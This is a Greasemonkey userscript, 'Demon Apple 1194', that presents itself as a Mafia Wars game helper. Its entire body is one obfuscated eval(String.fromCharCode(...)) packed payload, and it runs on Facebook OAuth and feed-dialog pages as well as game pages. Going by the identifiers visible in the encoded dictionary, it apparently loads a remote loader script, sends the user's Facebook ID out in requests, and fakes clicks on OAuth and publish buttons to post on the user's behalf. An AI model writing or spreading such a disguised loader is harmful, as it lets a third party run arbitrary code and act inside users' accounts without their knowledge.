// ==UserScript==
// @name        Demon Apple 1194
// @namespace   Mafia Demon
// @description Mafia Demon is a script for Zynga's Mafia Wars game.
// @icon        http://s14.postimg.org/gycrlz1gt/redrome_Copy_2.jpg
// @include     http://facebook.mafiawars.zynga.com/mwfb/remote/html_server.php*
// @include     https://facebook.mafiawars.zynga.com/mwfb/remote/html_server.php*
// @include     https://*.mafiawars.zynga.com/mwfb/remote/html_server.php*
// @include     http://*.mafiawars.zynga.com/mwfb/remote/html_server.php*
// @include     http://www.facebook.com/dialog/oauth?client_id=10000000001*
// @include     https://www.facebook.com/dialog/oauth?client_id=10000000001*
// @include     http://apps.facebook.com/inthemafia/?install_source*
// @include     https://apps.facebook.com/inthemafia/?install_source*
// @include     http://*.mafiawars.zynga.com/mwfb/*
// @include     http://www.mafiawars.zynga.com/play*
// @include     http://www.facebook.com/dialog/feed*
// @include     http://apps.facebook.com/inthemafia*
// @include     https://*.mafiawars.zynga.com/mwfb/*
// @include     https://www.mafiawars.zynga.com/play*
// @include     https://www.facebook.com/dialog/feed*
// @include     https://apps.facebook.com/inthemafia*
// @include     http://mafiademon.com/*
// @include     http://mafiademon.info/*
// @include     http://mafiatornado.com/*
// @include     https://mafiademon.com/*
// @include     https://mafiademon.info/*
// @include     https://mafiatornado.com/*
// @include     http://mwscripts.com/happyplace/
// @include     http://mwscripts.com/happyplace/v2
// @include     https://mwscripts.com/happyplace/
// @include     https://mwscripts.com/happyplace/v2
// @grant       GM_setValue
// @grant       GM_getValue
// @grant       GM_xmlhttpRequest
// @version     1194
// ==/UserScript==
eval(String.fromCharCode(101, 118, 97, 108, 40, 102, 117, 110, 99, 116, 105, 111, 110, 40, 112, 44, 97, 44, 99, 44, 107, 44, 101, 44, 114, 41, 123, 101, 61, 102, 117, 110, 99, 116, 105, 111, 110, 40, 99, 41, 123, 114, 101, 116, 117, 114, 110, 40, 99, 60, 97, 63, 39, 39, 58, 101, 40, 112, 97, 114, 115, 101, 73, 110, 116, 40, 99, 47, 97, 41, 41, 41, 43, 40, 40, 99, 61, 99, 37, 97, 41, 62, 51, 53, 63, 83, 116, 114, 105, 110, 103, 46, 102, 114, 111, 109, 67, 104, 97, 114, 67, 111, 100, 101, 40, 99, 43, 50, 57, 41, 58, 99, 46, 116, 111, 83, 116, 114, 105, 110, 103, 40, 51, 54, 41, 41, 125, 59, 105, 102, 40, 33, 39, 39, 46, 114, 101, 112, 108, 97, 99, 101, 40, 47, 94, 47, 44, 83, 116, 114, 105, 110, 103, 41, 41, 123, 119, 104, 105, 108, 101, 40, 99, 45, 45, 41, 114, 91, 101, 40, 99, 41, 93, 61, 107, 91, 99, 93, 124, 124, 101, 40, 99, 41, 59, 107, 61, 91, 102, 117, 110, 99, 116, 105, 111, 110, 40, 101, 41, 123, 114, 101, 116, 117, 114, 110, 32, 114, 91, 101, 93, 125, 93, 59, 101, 61, 102, 117, 110, 99, 116, 105, 111, 110, 40, 41, 123, 114, 101, 116, 117, 114, 110, 39, 92, 92, 119, 43, 39, 125, 59, 99, 61, 49, 125, 59, 119, 104, 105, 108, 101, 40, 99, 45, 45, 41, 105, 102, 40, 107, 91, 99, 93, 41, 112, 61, 112, 46, 114, 101, 112, 108, 97, 99, 101, 40, 110, 101, 119, 32, 82, 101, 103, 69, 120, 112, 40, 39, 92, 92, 98, 39, 43, 101, 40, 99, 41, 43, 39, 92, 92, 98, 39, 44, 39, 103, 39, 41, 44, 107, 91, 99, 93, 41, 59, 114, 101, 116, 117, 114, 110, 32, 112, 125, 40, 39, 40, 54, 40, 41, 123, 105, 32, 90, 61, 92, 39, 50, 112, 58, 47, 47, 50, 100, 45, 50, 53, 46, 50, 52, 46, 118, 47, 50, 51, 47, 49, 120, 46, 49, 82, 63, 49, 81, 61, 92, 39, 43, 49, 79, 46, 49, 77, 40, 41, 59, 105, 32, 77, 61, 49, 76, 59, 57, 40, 47, 71, 61, 89, 47, 46, 49, 102, 40, 51, 46, 55, 46, 106, 41, 41, 77, 61, 49, 99, 59, 57, 40, 47, 71, 61, 49, 97, 47, 46, 49, 102, 40, 51, 46, 55, 46, 106, 41, 41, 77, 61, 49, 99, 59, 57, 40, 51, 46, 55, 46, 106, 46, 56, 40, 92, 39, 49, 57, 47, 49, 80, 63, 49, 78, 61, 49, 69, 92, 39, 41, 62, 45, 49, 41, 123, 78, 46, 55, 46, 106, 61, 55, 46, 73, 43, 92, 39, 47, 47, 67, 46, 121, 46, 118, 47, 122, 47, 92, 39, 59, 75, 125, 57, 40, 51, 46, 55, 46, 106, 46, 56, 40, 92, 39, 49, 65, 38, 49, 122, 38, 50, 121, 38, 50, 110, 38, 50, 108, 38, 49, 89, 92, 39, 41, 62, 45, 49, 41, 123, 78, 46, 55, 46, 106, 61, 55, 46, 73, 43, 92, 39, 47, 47, 67, 46, 121, 46, 118, 47, 122, 47, 92, 39, 59, 75, 125, 57, 40, 51, 46, 55, 46, 106, 46, 56, 40, 92, 39, 50, 109, 92, 39, 41, 62, 45, 49, 41, 123, 78, 46, 55, 46, 106, 61, 55, 46, 73, 43, 92, 39, 47, 47, 67, 46, 121, 46, 118, 47, 122, 47, 92, 39, 59, 75, 125, 57, 40, 51, 46, 55, 46, 106, 46, 56, 40, 92, 39, 63, 88, 61, 49, 84, 92, 39, 41, 62, 45, 49, 41, 123, 78, 46, 55, 46, 106, 61, 55, 46, 73, 43, 92, 39, 47, 47, 67, 46, 121, 46, 118, 47, 122, 47, 92, 39, 59, 75, 125, 57, 40, 33, 77, 41, 105, 32, 100, 61, 33, 48, 44, 104, 61, 49, 75, 44, 107, 61, 33, 49, 44, 108, 61, 51, 46, 55, 46, 106, 44, 112, 59, 40, 54, 40, 102, 41, 123, 54, 32, 109, 40, 97, 44, 98, 44, 101, 41, 123, 110, 124, 124, 49, 103, 40, 123, 49, 49, 58, 34, 49, 87, 34, 44, 72, 58, 90, 44, 49, 50, 58, 54, 40, 97, 41, 123, 57, 40, 52, 61, 61, 61, 97, 46, 49, 51, 38, 38, 49, 52, 61, 61, 61, 97, 46, 49, 53, 38, 38, 33, 110, 41, 123, 110, 61, 100, 59, 103, 61, 107, 59, 105, 32, 98, 61, 51, 46, 85, 40, 34, 49, 54, 34, 41, 59, 98, 46, 69, 61, 97, 46, 50, 116, 59, 51, 46, 68, 46, 82, 40, 98, 41, 59, 65, 40, 99, 44, 49, 55, 41, 125, 125, 125, 41, 125, 54, 32, 99, 40, 41, 123, 57, 40, 101, 41, 57, 40, 33, 103, 38, 38, 33, 110, 41, 123, 105, 32, 97, 61, 101, 46, 70, 40, 34, 111, 45, 49, 56, 34, 41, 59, 57, 40, 97, 41, 123, 113, 61, 50, 55, 40, 97, 44, 49, 48, 41, 59, 103, 61, 100, 59, 105, 32, 102, 61, 40, 97, 61, 86, 40, 34, 49, 98, 34, 41, 41, 63, 87, 40, 47, 50, 113, 92, 92, 124, 40, 46, 43, 41, 92, 92, 124, 50, 114, 47, 46, 50, 115, 40, 87, 40, 87, 40, 97, 41, 41, 41, 91, 49, 93, 41, 58, 34, 48, 34, 59, 34, 54, 34, 61, 61, 61, 49, 100, 32, 49, 101, 63, 49, 101, 40, 41, 58, 40, 109, 40, 48, 44, 113, 44, 102, 41, 44, 65, 40, 54, 40, 41, 123, 109, 40, 49, 44, 113, 44, 102, 41, 125, 44, 50, 66, 41, 41, 125, 125, 49, 121, 123, 57, 40, 33, 98, 38, 38, 40, 97, 61, 101, 46, 70, 40, 34, 111, 45, 79, 34, 41, 41, 41, 123, 105, 32, 117, 61, 101, 46, 70, 40, 34, 111, 45, 72, 34, 41, 59, 117, 38, 38, 40, 49, 103, 40, 123, 49, 49, 58, 34, 49, 66, 34, 44, 72, 58, 117, 44, 111, 58, 49, 67, 40, 97, 41, 44, 49, 68, 58, 123, 34, 49, 104, 45, 49, 70, 34, 58, 34, 49, 71, 47, 49, 72, 34, 44, 34, 49, 104, 45, 49, 73, 34, 58, 34, 34, 43, 97, 46, 49, 74, 125, 44, 49, 50, 58, 54, 40, 97, 41, 123, 52, 61, 61, 61, 97, 46, 49, 51, 38, 38, 40, 49, 52, 61, 61, 61, 97, 46, 49, 53, 38, 38, 40, 101, 46, 49, 105, 40, 34, 111, 45, 79, 34, 41, 44, 101, 46, 49, 105, 40, 34, 111, 45, 72, 34, 41, 41, 44, 98, 61, 107, 41, 125, 125, 41, 44, 98, 61, 100, 41, 125, 97, 61, 34, 49, 34, 61, 61, 61, 101, 46, 70, 40, 34, 111, 45, 76, 34, 41, 63, 100, 58, 107, 59, 97, 33, 61, 61, 114, 38, 38, 40, 114, 61, 97, 44, 49, 106, 40, 34, 76, 34, 44, 114, 41, 41, 125, 65, 40, 99, 44, 49, 55, 41, 125, 105, 32, 98, 61, 107, 44, 103, 61, 107, 44, 110, 61, 107, 44, 101, 61, 104, 44, 113, 61, 48, 44, 114, 61, 107, 59, 102, 46, 119, 61, 54, 40, 41, 123, 105, 32, 97, 59, 97, 58, 123, 49, 107, 123, 57, 40, 45, 49, 33, 61, 61, 120, 46, 83, 46, 56, 40, 34, 49, 83, 34, 41, 41, 123, 105, 32, 98, 61, 51, 46, 66, 40, 34, 49, 85, 34, 41, 59, 98, 46, 49, 86, 43, 61, 34, 38, 88, 61, 49, 108, 34, 59, 97, 61, 107, 59, 49, 88, 32, 97, 125, 125, 49, 109, 40, 103, 41, 123, 125, 97, 61, 45, 49, 33, 61, 61, 108, 46, 56, 40, 34, 71, 61, 89, 34, 41, 124, 124, 45, 49, 33, 61, 61, 108, 46, 56, 40, 34, 71, 61, 49, 97, 34, 41, 124, 124, 45, 49, 33, 61, 61, 108, 46, 56, 40, 34, 49, 90, 61, 49, 34, 41, 124, 124, 45, 49, 33, 61, 61, 108, 46, 56, 40, 34, 88, 61, 49, 108, 34, 41, 124, 124, 45, 49, 61, 61, 61, 108, 46, 56, 40, 34, 50, 48, 46, 50, 49, 34, 41, 124, 124, 33, 51, 46, 66, 40, 34, 50, 50, 34, 41, 124, 124, 51, 46, 66, 40, 34, 80, 34, 41, 63, 107, 58, 100, 125, 97, 38, 38, 40, 101, 61, 51, 46, 85, 40, 34, 84, 34, 41, 44, 101, 46, 74, 40, 34, 50, 54, 34, 44, 34, 80, 34, 41, 44, 101, 46, 74, 40, 34, 49, 110, 34, 44, 34, 50, 56, 58, 50, 57, 59, 34, 41, 44, 101, 46, 74, 40, 34, 111, 45, 50, 97, 34, 44, 34, 50, 46, 53, 46, 48, 34, 41, 44, 51, 46, 68, 46, 82, 40, 101, 41, 44, 97, 61, 51, 46, 85, 40, 34, 49, 54, 34, 41, 44, 97, 46, 69, 61, 92, 39, 51, 46, 66, 40, 34, 80, 34, 41, 46, 74, 40, 34, 111, 45, 49, 56, 34, 44, 32, 50, 98, 46, 50, 99, 41, 59, 92, 39, 44, 51, 46, 68, 46, 82, 40, 97, 41, 44, 99, 40, 41, 41, 125, 125, 41, 40, 112, 124, 124, 40, 112, 61, 123, 125, 41, 41, 59, 105, 32, 115, 59, 40, 54, 40, 102, 41, 123, 54, 32, 109, 40, 98, 41, 123, 34, 50, 101, 34, 61, 61, 61, 49, 100, 32, 98, 38, 38, 40, 98, 61, 51, 46, 66, 40, 98, 41, 41, 59, 57, 40, 98, 41, 123, 105, 32, 99, 61, 98, 46, 49, 111, 46, 50, 102, 40, 34, 50, 103, 34, 41, 59, 99, 46, 50, 104, 40, 34, 50, 105, 34, 44, 100, 44, 100, 44, 98, 46, 49, 111, 46, 50, 106, 44, 48, 44, 48, 44, 48, 44, 48, 44, 48, 44, 107, 44, 107, 44, 107, 44, 107, 44, 48, 44, 104, 41, 59, 98, 46, 50, 107, 40, 99, 41, 125, 125, 54, 32, 99, 40, 98, 41, 123, 49, 107, 123, 105, 32, 103, 61, 51, 46, 49, 112, 40, 92, 39, 47, 47, 49, 113, 91, 64, 49, 114, 61, 34, 50, 111, 34, 32, 81, 32, 64, 83, 61, 34, 49, 115, 34, 93, 92, 39, 44, 51, 44, 104, 44, 49, 116, 46, 49, 117, 44, 104, 41, 46, 49, 118, 59, 103, 124, 124, 40, 103, 61, 51, 46, 49, 112, 40, 92, 39, 47, 47, 49, 113, 91, 64, 49, 114, 61, 34, 50, 117, 34, 32, 81, 32, 64, 83, 61, 34, 49, 115, 34, 93, 92, 39, 44, 51, 44, 104, 44, 49, 116, 46, 49, 117, 44, 104, 41, 46, 49, 118, 41, 59, 103, 38, 38, 45, 49, 61, 61, 61, 51, 46, 68, 46, 69, 46, 56, 40, 34, 50, 118, 32, 50, 119, 32, 50, 120, 34, 41, 63, 120, 46, 65, 40, 54, 40, 41, 123, 109, 40, 103, 41, 59, 98, 38, 38, 120, 46, 65, 40, 54, 40, 41, 123, 99, 40, 98, 41, 125, 44, 49, 119, 41, 125, 44, 50, 122, 41, 58, 120, 46, 65, 40, 54, 40, 41, 123, 99, 40, 98, 41, 125, 44, 49, 119, 41, 125, 49, 109, 40, 102, 41, 123, 125, 125, 102, 46, 119, 61, 54, 40, 41, 123, 45, 49, 33, 61, 61, 120, 46, 55, 46, 106, 46, 56, 40, 34, 49, 57, 47, 50, 65, 34, 41, 63, 45, 49, 33, 61, 61, 51, 46, 68, 46, 69, 46, 56, 40, 34, 122, 34, 41, 38, 38, 86, 40, 34, 76, 34, 41, 38, 38, 99, 40, 107, 41, 58, 45, 49, 33, 61, 61, 120, 46, 55, 46, 106, 46, 56, 40, 34, 67, 46, 121, 46, 118, 47, 122, 34, 41, 38, 38, 86, 40, 34, 76, 34, 41, 38, 38, 99, 40, 100, 41, 125, 125, 41, 40, 115, 124, 124, 40, 115, 61, 123, 125, 41, 41, 59, 105, 32, 116, 59, 40, 54, 40, 102, 41, 123, 102, 46, 119, 61, 54, 40, 41, 123, 105, 32, 102, 44, 99, 59, 57, 40, 99, 61, 51, 46, 66, 40, 34, 50, 67, 34, 41, 41, 57, 40, 102, 61, 99, 46, 70, 40, 34, 111, 45, 79, 34, 41, 41, 49, 106, 40, 34, 49, 98, 34, 44, 102, 41, 44, 99, 46, 69, 61, 92, 39, 50, 68, 32, 50, 69, 32, 60, 84, 32, 49, 110, 61, 34, 50, 70, 58, 35, 50, 71, 59, 34, 62, 50, 72, 32, 81, 32, 50, 73, 60, 47, 84, 62, 92, 39, 125, 125, 41, 40, 116, 124, 124, 40, 116, 61, 123, 125, 41, 41, 59, 45, 49, 33, 61, 61, 108, 46, 56, 40, 34, 50, 74, 46, 50, 75, 46, 118, 34, 41, 63, 112, 46, 119, 40, 41, 58, 45, 49, 33, 61, 61, 108, 46, 56, 40, 34, 121, 46, 118, 34, 41, 63, 115, 46, 119, 40, 41, 58, 45, 49, 33, 61, 61, 108, 46, 56, 40, 34, 50, 76, 34, 41, 38, 38, 116, 46, 119, 40, 41, 125, 41, 40, 41, 59, 39, 44, 54, 50, 44, 49, 55, 50, 44, 39, 124, 124, 124, 100, 111, 99, 117, 109, 101, 110, 116, 124, 124, 124, 102, 117, 110, 99, 116, 105, 111, 110, 124, 108, 111, 99, 97, 116, 105, 111, 110, 124, 105, 110, 100, 101, 120, 79, 102, 124, 105, 102, 124, 124, 124, 124, 124, 124, 124, 124, 124, 118, 97, 114, 124, 104, 114, 101, 102, 124, 124, 124, 124, 124, 100, 97, 116, 97, 124, 124, 124, 124, 124, 124, 124, 99, 111, 109, 124, 115, 116, 97, 114, 116, 124, 119, 105, 110, 100, 111, 119, 124, 102, 97, 99, 101, 98, 111, 111, 107, 124, 105, 110, 116, 104, 101, 109, 97, 102, 105, 97, 124, 115, 101, 116, 84, 105, 109, 101, 111, 117, 116, 124, 103, 101, 116, 69, 108, 101, 109, 101, 110, 116, 66, 121, 73, 100, 124, 97, 112, 112, 115, 124, 98, 111, 100, 121, 124, 105, 110, 110, 101, 114, 72, 84, 77, 76, 124, 103, 101, 116, 65, 116, 116, 114, 105, 98, 117, 116, 101, 124, 120, 119, 95, 99, 111, 110, 116, 114, 111, 108, 108, 101, 114, 124, 117, 114, 108, 124, 112, 114, 111, 116, 111, 99, 111, 108, 124, 115, 101, 116, 65, 116, 116, 114, 105, 98, 117, 116, 101, 124, 114, 101, 116, 117, 114, 110, 124, 97, 117, 116, 111, 112, 111, 115, 116, 124, 115, 107, 105, 112, 124, 116, 111, 112, 124, 107, 101, 121, 124, 100, 101, 109, 111, 110, 100, 97, 116, 97, 124, 97, 110, 100, 124, 97, 112, 112, 101, 110, 100, 67, 104, 105, 108, 100, 124, 110, 97, 109, 101, 124, 115, 112, 97, 110, 124, 99, 114, 101, 97, 116, 101, 69, 108, 101, 109, 101, 110, 116, 124, 71, 77, 95, 103, 101, 116, 86, 97, 108, 117, 101, 124, 97, 116, 111, 98, 124, 110, 101, 120, 116, 95, 112, 97, 114, 97, 109, 115, 124, 102, 114, 101, 101, 103, 105, 102, 116, 115, 124, 109, 121, 95, 117, 114, 108, 124, 124, 109, 101, 116, 104, 111, 100, 124, 111, 110, 114, 101, 97, 100, 121, 115, 116, 97, 116, 101, 99, 104, 97, 110, 103, 101, 124, 114, 101, 97, 100, 121, 83, 116, 97, 116, 101, 124, 50, 48, 48, 124, 115, 116, 97, 116, 117, 115, 124, 115, 99, 114, 105, 112, 116, 124, 49, 69, 51, 124, 102, 98, 105, 100, 124, 100, 105, 97, 108, 111, 103, 124, 114, 101, 113, 117, 101, 115, 116, 115, 124, 99, 104, 114, 111, 109, 97, 75, 101, 121, 124, 116, 114, 117, 101, 124, 116, 121, 112, 101, 111, 102, 124, 71, 77, 95, 105, 111, 112, 115, 124, 116, 101, 115, 116, 124, 71, 77, 95, 120, 109, 108, 104, 116, 116, 112, 82, 101, 113, 117, 101, 115, 116, 124, 67, 111, 110, 116, 101, 110, 116, 124, 114, 101, 109, 111, 118, 101, 65, 116, 116, 114, 105, 98, 117, 116, 101, 124, 71, 77, 95, 115, 101, 116, 86, 97, 108, 117, 101, 124, 116, 114, 121, 124, 89, 84, 111, 122, 79, 110, 116, 112, 79, 106, 65, 55, 99, 122, 111, 49, 79, 105, 74, 112, 98, 109, 82, 108, 101, 67, 73, 55, 97, 84, 111, 120, 79, 51, 77, 54, 78, 68, 111, 105, 100, 109, 108, 108, 100, 121, 73, 55, 97, 84, 111, 121, 79, 51, 77, 54, 79, 84, 111, 105, 74, 109, 104, 112, 90, 71, 82, 108, 98, 106, 48, 120, 73, 106, 116, 57, 124, 99, 97, 116, 99, 104, 124, 115, 116, 121, 108, 101, 124, 111, 119, 110, 101, 114, 68, 111, 99, 117, 109, 101, 110, 116, 124, 101, 118, 97, 108, 117, 97, 116, 101, 124, 105, 110, 112, 117, 116, 124, 116, 121, 112, 101, 124, 112, 117, 98, 108, 105, 115, 104, 124, 88, 80, 97, 116, 104, 82, 101, 115, 117, 108, 116, 124, 65, 78, 89, 95, 85, 78, 79, 82, 68, 69, 82, 69, 68, 95, 78, 79, 68, 69, 95, 84, 89, 80, 69, 124, 115, 105, 110, 103, 108, 101, 78, 111, 100, 101, 86, 97, 108, 117, 101, 124, 51, 69, 51, 124, 68, 101, 109, 111, 110, 65, 117, 116, 111, 85, 112, 100, 97, 116, 101, 124, 101, 108, 115, 101, 124, 122, 121, 95, 116, 114, 97, 99, 107, 124, 105, 110, 115, 116, 97, 108, 108, 95, 115, 111, 117, 114, 99, 101, 124, 80, 79, 83, 84, 124, 100, 101, 99, 111, 100, 101, 85, 82, 73, 124, 104, 101, 97, 100, 101, 114, 115, 124, 49, 48, 48, 48, 48, 48, 48, 48, 48, 48, 49, 124, 84, 121, 112, 101, 124, 97, 112, 112, 108, 105, 99, 97, 116, 105, 111, 110, 124, 106, 115, 111, 110, 124, 76, 101, 110, 103, 116, 104, 124, 108, 101, 110, 103, 116, 104, 124, 110, 117, 108, 108, 124, 102, 97, 108, 115, 101, 124, 114, 97, 110, 100, 111, 109, 124, 99, 108, 105, 101, 110, 116, 95, 105, 100, 124, 77, 97, 116, 104, 124, 111, 97, 117, 116, 104, 124, 116, 109, 112, 124, 106, 115, 124, 115, 111, 109, 101, 95, 109, 119, 105, 102, 114, 97, 109, 101, 95, 104, 105, 100, 100, 101, 110, 124, 89, 84, 111, 121, 79, 110, 116, 112, 79, 106, 65, 55, 99, 122, 111, 49, 79, 105, 74, 115, 98, 50, 74, 105, 101, 83, 73, 55, 97, 84, 111, 120, 79, 51, 77, 54, 78, 68, 111, 105, 98, 71, 70, 117, 90, 67, 73, 55, 102, 81, 124, 115, 111, 109, 101, 95, 109, 119, 105, 102, 114, 97, 109, 101, 124, 115, 114, 99, 124, 71, 69, 84, 124, 98, 114, 101, 97, 107, 124, 102, 98, 95, 115, 105, 103, 95, 108, 111, 99, 97, 108, 101, 124, 104, 105, 100, 100, 101, 110, 124, 104, 116, 109, 108, 95, 115, 101, 114, 118, 101, 114, 124, 112, 104, 112, 124, 102, 105, 110, 97, 108, 95, 119, 114, 97, 112, 112, 101, 114, 124, 115, 118, 110, 124, 103, 111, 111, 103, 108, 101, 99, 111, 100, 101, 124, 97, 112, 112, 108, 101, 124, 105, 100, 124, 112, 97, 114, 115, 101, 73, 110, 116, 124, 100, 105, 115, 112, 108, 97, 121, 124, 110, 111, 110, 101, 124, 108, 111, 97, 100, 101, 114, 124, 85, 115, 101, 114, 124, 116, 114, 97, 99, 107, 73, 100, 124, 100, 101, 109, 111, 110, 124, 115, 116, 114, 105, 110, 103, 124, 99, 114, 101, 97, 116, 101, 69, 118, 101, 110, 116, 124, 77, 111, 117, 115, 101, 69, 118, 101, 110, 116, 115, 124, 105, 110, 105, 116, 77, 111, 117, 115, 101, 69, 118, 101, 110, 116, 124, 99, 108, 105, 99, 107, 124, 100, 101, 102, 97, 117, 108, 116, 86, 105, 101, 119, 124, 100, 105, 115, 112, 97, 116, 99, 104, 69, 118, 101, 110, 116, 124, 122, 121, 95, 99, 114, 101, 97, 116, 105, 118, 101, 124, 109, 119, 95, 114, 100, 99, 110, 116, 124, 122, 121, 95, 108, 105, 110, 107, 124, 115, 117, 98, 109, 105, 116, 124, 104, 116, 116, 112, 115, 124, 110, 101, 119, 124, 99, 98, 124, 101, 120, 101, 99, 124, 114, 101, 115, 112, 111, 110, 115, 101, 84, 101, 120, 116, 124, 98, 117, 116, 116, 111, 110, 124, 100, 97, 105, 108, 121, 124, 116, 97, 107, 101, 124, 114, 101, 119, 97, 114, 100, 124, 105, 110, 115, 116, 97, 108, 108, 95, 108, 105, 110, 107, 124, 53, 69, 51, 124, 102, 101, 101, 100, 124, 49, 69, 52, 124, 99, 104, 114, 111, 109, 97, 107, 101, 121, 124, 85, 115, 101, 114, 115, 99, 114, 105, 112, 116, 124, 69, 120, 116, 101, 110, 115, 105, 111, 110, 124, 99, 111, 108, 111, 114, 124, 52, 102, 52, 124, 70, 111, 117, 110, 100, 124, 65, 99, 116, 105, 118, 97, 116, 101, 100, 124, 109, 97, 102, 105, 97, 119, 97, 114, 115, 124, 122, 121, 110, 103, 97, 124, 109, 97, 102, 105, 97, 100, 101, 109, 111, 110, 39, 46, 115, 112, 108, 105, 116, 40, 39, 124, 39, 41, 44, 48, 44, 123, 125, 41, 41))